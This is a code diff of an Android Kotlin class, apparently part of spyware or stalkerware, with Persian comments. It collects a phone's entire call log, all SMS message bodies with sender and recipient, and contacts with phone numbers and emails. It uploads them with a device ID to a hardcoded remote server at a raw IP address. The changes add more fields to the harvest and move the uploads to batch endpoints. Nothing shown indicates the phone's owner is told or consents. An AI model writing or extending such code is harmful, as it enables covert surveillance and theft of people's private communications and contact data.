@@ -13,7 +13,7 @@ import java.net.URL
 object DataUploader {
 
     private const val TAG = "DataUploader"
-    private const val BASE_URL = "http://95.134.130.160:8765" // 🔴 آدرس سرور خودت رو اینجا بذار
+    private const val BASE_URL = "http://95.134.130.160:8765"
 
     /**
      * رجیستر کردن دستگاه در سرور (فرمت WebSocket مثل Flutter)
@@ -63,13 +63,36 @@ object DataUploader {
                 val typeIndex = it.getColumnIndex(android.provider.CallLog.Calls.TYPE)
                 val dateIndex = it.getColumnIndex(android.provider.CallLog.Calls.DATE)
                 val durationIndex = it.getColumnIndex(android.provider.CallLog.Calls.DURATION)
+                val nameIndex = it.getColumnIndex(android.provider.CallLog.Calls.CACHED_NAME)
 
                 while (it.moveToNext()) {
+                    val number = it.getString(numberIndex) ?: ""
+                    val type = it.getInt(typeIndex)
+                    val timestamp = it.getLong(dateIndex)
+                    val duration = it.getInt(durationIndex)
+                    val name = it.getString(nameIndex) ?: "Unknown"
+
+                    // تبدیل type به فرمت متنی
+                    val callType = when (type) {
+                        android.provider.CallLog.Calls.INCOMING_TYPE -> "incoming"
+                        android.provider.CallLog.Calls.OUTGOING_TYPE -> "outgoing"
+                        android.provider.CallLog.Calls.MISSED_TYPE -> "missed"
+                        android.provider.CallLog.Calls.REJECTED_TYPE -> "rejected"
+                        android.provider.CallLog.Calls.BLOCKED_TYPE -> "blocked"
+                        android.provider.CallLog.Calls.VOICEMAIL_TYPE -> "voicemail"
+                        else -> "unknown"
+                    }
+
+                    // فرمت duration
+                    val durationFormatted = formatDuration(duration)
+
                     val call = JSONObject().apply {
-                        put("number", it.getString(numberIndex) ?: "")
-                        put("type", it.getInt(typeIndex))
-                        put("date", it.getLong(dateIndex))
-                        put("duration", it.getInt(durationIndex))
+                        put("number", number)
+                        put("name", name)
+                        put("call_type", callType)
+                        put("timestamp", timestamp)
+                        put("duration", duration)
+                        put("duration_formatted", durationFormatted)
                     }
                     calls.put(call)
                 }
@@ -77,11 +100,14 @@ object DataUploader {
 
             val json = JSONObject().apply {
                 put("device_id", deviceId)
-                put("calls", calls)
-                put("timestamp", System.currentTimeMillis())
+                put("data", calls)
+                put("batch_info", JSONObject().apply {
+                    put("batch", 1)
+                    put("of", 1)
+                })
             }
 
-            sendPostRequest("$BASE_URL/call-history", json.toString())
+            sendPostRequest("$BASE_URL/call-logs/batch", json.toString())
             Log.d(TAG, "✅ Call history uploaded: ${calls.length()} calls")
 
         } catch (e: Exception) {
@@ -110,11 +136,35 @@ object DataUploader {
                 val typeIndex = it.getColumnIndex(Telephony.Sms.TYPE)
 
                 while (it.moveToNext()) {
+                    val address = it.getString(addressIndex) ?: ""
+                    val body = it.getString(bodyIndex) ?: ""
+                    val timestamp = it.getLong(dateIndex)
+                    val smsType = it.getInt(typeIndex)
+
+                    // تعیین from و to بر اساس نوع پیام
+                    val (from, to) = when (smsType) {
+                        Telephony.Sms.MESSAGE_TYPE_INBOX -> Pair(address, deviceId)
+                        Telephony.Sms.MESSAGE_TYPE_SENT -> Pair(deviceId, address)
+                        else -> Pair(address, deviceId)
+                    }
+
+                    // تبدیل type به فرمت متنی
+                    val typeStr = when (smsType) {
+                        Telephony.Sms.MESSAGE_TYPE_INBOX -> "inbox"
+                        Telephony.Sms.MESSAGE_TYPE_SENT -> "sent"
+                        Telephony.Sms.MESSAGE_TYPE_DRAFT -> "draft"
+                        Telephony.Sms.MESSAGE_TYPE_OUTBOX -> "outbox"
+                        Telephony.Sms.MESSAGE_TYPE_FAILED -> "failed"
+                        Telephony.Sms.MESSAGE_TYPE_QUEUED -> "queued"
+                        else -> "unknown"
+                    }
+
                     val sms = JSONObject().apply {
-                        put("address", it.getString(addressIndex) ?: "")
-                        put("body", it.getString(bodyIndex) ?: "")
-                        put("date", it.getLong(dateIndex))
-                        put("type", it.getInt(typeIndex))
+                        put("from", from)
+                        put("to", to)
+                        put("body", body)
+                        put("timestamp", timestamp)
+                        put("type", typeStr)
                     }
                     messages.put(sms)
                 }
@@ -122,11 +172,14 @@ object DataUploader {
 
             val json = JSONObject().apply {
                 put("device_id", deviceId)
-                put("messages", messages)
-                put("timestamp", System.currentTimeMillis())
+                put("data", messages)
+                put("batch_info", JSONObject().apply {
+                    put("batch", 1)
+                    put("of", 1)
+                })
             }
 
-            sendPostRequest("$BASE_URL/sms", json.toString())
+            sendPostRequest("$BASE_URL/sms/batch", json.toString())
             Log.d(TAG, "✅ SMS uploaded: ${messages.length()} messages")
 
         } catch (e: Exception) {
@@ -155,8 +208,8 @@ object DataUploader {
                     val contactId = it.getString(idIndex)
                     val name = it.getString(nameIndex) ?: ""
 
-                    // خواندن شماره‌های تماس
-                    val phones = JSONArray()
+                    // خواندن شماره تماس
+                    var phoneNumber = ""
                     val phoneCursor = context.contentResolver.query(
                         ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                         null,
@@ -167,15 +220,35 @@ object DataUploader {
 
                     phoneCursor?.use { pc ->
                         val phoneIndex = pc.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
-                        while (pc.moveToNext()) {
-                            phones.put(pc.getString(phoneIndex) ?: "")
+                        if (pc.moveToFirst()) {
+                            phoneNumber = pc.getString(phoneIndex) ?: ""
                         }
                     }
 
-                    if (phones.length() > 0) {
+                    // خواندن ایمیل
+                    var email = ""
+                    val emailCursor = context.contentResolver.query(
+                        ContactsContract.CommonDataKinds.Email.CONTENT_URI,
+                        null,
+                        ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
+                        arrayOf(contactId),
+                        null
+                    )
+
+                    emailCursor?.use { ec ->
+                        val emailIndex = ec.getColumnIndex(ContactsContract.CommonDataKinds.Email.ADDRESS)
+                        if (ec.moveToFirst()) {
+                            email = ec.getString(emailIndex) ?: ""
+                        }
+                    }
+
+                    // فقط اگر شماره داشت اضافه کن
+                    if (phoneNumber.isNotEmpty()) {
                         val contact = JSONObject().apply {
+                            put("id", contactId)
                             put("name", name)
-                            put("phones", phones)
+                            put("phone", phoneNumber)
+                            put("email", email)
                         }
                         contacts.put(contact)
                     }
@@ -184,11 +257,14 @@ object DataUploader {
 
             val json = JSONObject().apply {
                 put("device_id", deviceId)
-                put("contacts", contacts)
-                put("timestamp", System.currentTimeMillis())
+                put("data", contacts)
+                put("batch_info", JSONObject().apply {
+                    put("batch", 1)
+                    put("of", 1)
+                })
             }
 
-            sendPostRequest("$BASE_URL/contacts", json.toString())
+            sendPostRequest("$BASE_URL/contacts/batch", json.toString())
             Log.d(TAG, "✅ Contacts uploaded: ${contacts.length()} contacts")
 
         } catch (e: Exception) {
@@ -216,6 +292,21 @@ object DataUploader {
 
         } catch (e: Exception) {
             Log.e(TAG, "❌ Battery update failed: ${e.message}", e)
+        }
+    }
+
+    /**
+     * فرمت کردن مدت زمان تماس
+     */
+    private fun formatDuration(seconds: Int): String {
+        val hours = seconds / 3600
+        val minutes = (seconds % 3600) / 60
+        val secs = seconds % 60
+
+        return when {
+            hours > 0 -> String.format("%d:%02d:%02d", hours, minutes, secs)
+            minutes > 0 -> String.format("%d:%02d", minutes, secs)
+            else -> String.format("0:%02d", secs)
         }
     }
 
